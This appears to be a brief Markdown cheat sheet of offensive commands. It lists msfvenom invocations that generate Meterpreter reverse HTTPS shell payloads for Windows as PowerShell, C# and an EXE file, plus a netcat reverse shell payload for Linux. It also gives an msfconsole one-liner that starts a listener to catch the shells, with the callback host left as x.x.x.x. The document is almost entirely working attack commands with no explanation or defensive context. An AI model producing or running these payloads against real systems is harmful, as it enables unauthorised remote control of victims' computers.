
# Windows
## PowerShell

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f ps1
```

### Csharp

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f csharp
```

### EXE

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f exe > shell.exe
```

## Multi-Handler

```bash
sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST x.x.x.x;set LPORT 443;run;"
```
# Linux

### Netcat

```bash
sudo msfvenom -p cmd/unix/reverse_netcat lhost=x.x.x.x lport=443
```

